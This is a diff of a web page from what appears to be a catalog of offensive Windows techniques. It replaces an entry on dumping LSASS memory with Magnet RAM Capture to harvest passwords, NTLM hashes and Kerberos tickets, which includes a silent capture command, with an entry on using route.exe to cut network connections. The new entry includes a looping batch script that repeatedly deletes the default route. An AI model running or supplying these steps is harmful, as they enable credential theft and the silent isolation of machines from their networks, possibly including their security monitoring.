@@ -32,27 +32,29 @@
   <!-- Contenido de la técnica -->
   <main class="flex-1 p-6">
     <div class="content-box p-6 rounded-xl max-w-4xl mx-auto">
-      <h2 class="text-2xl font-bold glow-text mb-4">Lsass Dump using Magnet RAM Capture</h2>
+      <h2 class="text-2xl font-bold glow-text mb-4">Route.exe to remove connections</h2>
 
       <section class="mb-6">
         <h3 class="text-xl font-semibold glow-text mb-2">Description</h3>
         <p>
-         This technique involves extracting the contents of the LSASS (Local Security Authority Subsystem Service) process from memory using a forensic memory acquisition tool, Magnet RAM Capture, to later analyze it offline. The goal is typically to retrieve sensitive credential material (like plaintext passwords, NTLM hashes, or Kerberos tickets) stored in memory by the LSASS process.
-        </p>
+This technique involves the use of the built-in Windows command-line utility route.exe to manipulate the system's routing table, specifically to remove existing network routes, effectively cutting off or rerouting network communications.        </p>
       </section>
 
       <section class="mb-6">
         <h3 class="text-xl font-semibold glow-text mb-2">Steps</h3>
         <ol class="list-decimal list-inside space-y-2 break-words">
-          <li>Download tool: https://www.magnetforensics.com/resources/magnet-ram-capture/</li>
-          <li>Use GUI or commandline:</li>
+          <li>Route.exe delete 0.0.0.0 to kill all conections</li>
+          <li>Route.exe add 'exclusion IP' mask 'Your Mask' 0.0.0.0 to add a exclusion</li>
+          <li>Make a loop:</li>
+          <pre class="bg-black text-green-400 p-4 rounded overflow-x-auto">
+@echo off
+:loop
+route delete 0.0.0.0 >nul 2>&1
+route add 'exclusion IP' mask 'Your Mask' 0.0.0.0
+timeout /t 3 >nul
+goto loop
+          </pre>
         </ol>
-      </section>
-
-      <section class="mb-6">
-        <pre class="bg-black text-green-400 p-4 rounded overflow-x-auto">
-MRCv120.exe /accepteula /silent /go
-        </pre>
       </section>
     </div>
   </main>
